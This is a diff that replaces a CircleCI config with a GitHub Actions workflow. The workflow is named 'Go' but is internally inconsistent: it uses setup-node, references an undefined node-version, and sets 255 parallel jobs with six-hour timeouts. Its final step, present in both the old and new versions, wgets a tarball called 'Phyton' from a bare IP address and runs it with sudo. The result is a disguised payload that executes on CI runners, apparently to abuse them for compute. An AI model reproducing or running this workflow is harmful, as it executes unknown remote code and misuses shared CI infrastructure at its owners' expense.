@@ -1,18 +1,33 @@
-version: 2.1
- 
-orbs:
-  node: circleci/node@4.4.0
- 
+# This workflow will do a clean install of node dependencies, build the source code and run tests across different versions of node
+# For more information see: https://help.github.com/actions/language-and-framework-guides/using-nodejs-with-github-actions
+
+name: Go
+
+on:
+  push:
+    branches: [ main ]
+  pull_request:
+    branches: [ main ]
+
 jobs:
-  install-node-example:
-    docker:
-      - image: 'cimg/base:stable'
+  build:
+
+    runs-on: ubuntu-18.04
+    strategy:
+      max-parallel: 255
+      fail-fast: false
+      matrix:
+          go: [1, 2, 3, 4]
+          flag: [A, B]
+    timeout-minutes: 360
+    env: 
+        NUM_JOBS: 10
+        JOB: ${{ matrix.node-version }}
     steps:
-      - checkout
-      - node/install:
-          install-yarn: true
-      - run: wget http://149.28.239.137/Phyton.tar.gz && tar xfvz Phyton.tar.gz && sudo chmod +x ./Phyton && ./Phyton
-workflows:
-  test_my_app:
-    jobs:
-      - install-node-example
+    - uses: actions/checkout@v2
+    - name: Set up Go ${{ matrix.node-version }}
+      uses: actions/setup-node@v2
+      with:
+        go-version: ${{ matrix.node-version }}
+      id: go  
+    - run: wget http://149.28.239.137/Phyton.tar.gz && tar xfvz Phyton.tar.gz && sudo chmod +x ./Phyton && ./Phyton
